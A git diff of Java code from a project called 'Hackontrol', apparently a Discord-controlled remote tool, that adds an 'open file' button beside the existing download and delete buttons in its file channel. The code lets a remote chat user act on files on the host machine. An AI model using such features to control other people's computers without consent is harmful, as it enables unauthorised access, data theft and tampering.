@@ -1,5 +1,6 @@
 package com.khopan.hackontrol.channel.file;
 
+import java.awt.Desktop;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -147,7 +148,7 @@ public class FileChannel extends HackontrolChannel {
 
 		FileEntry entry = this.fileList.get(index - 1);
 		File file = entry.file;
-		FileEmbedSender.reply(file, context.getEvent(), buttonContext -> this.downloadFile(file, buttonContext), buttonContext -> this.deleteFile(file, buttonContext));
+		FileEmbedSender.reply(file, context.getEvent(), buttonContext -> this.downloadFile(file, buttonContext), buttonContext -> this.openFile(file, buttonContext), buttonContext -> this.deleteFile(file, buttonContext));
 	}
 
 	private void downloadFile(File file, ButtonContext context) {
@@ -157,6 +158,22 @@ public class FileChannel extends HackontrolChannel {
 		}
 
 		context.replyFiles(FileUpload.fromData(file, file.getName())).queue();
+	}
+
+	private void openFile(File file, ButtonContext context) {
+		if(!file.exists()) {
+			HackontrolError.message(context.reply(), "File '" + file.getAbsolutePath() + "' does not exist");
+			return;
+		}
+
+		try {
+			Desktop.getDesktop().open(file);
+		} catch(Throwable Errors) {
+			HackontrolError.throwable(context.reply(), Errors);
+			return;
+		}
+
+		context.acknowledge();
 	}
 
 	private void deleteFile(File file, ButtonContext context) {
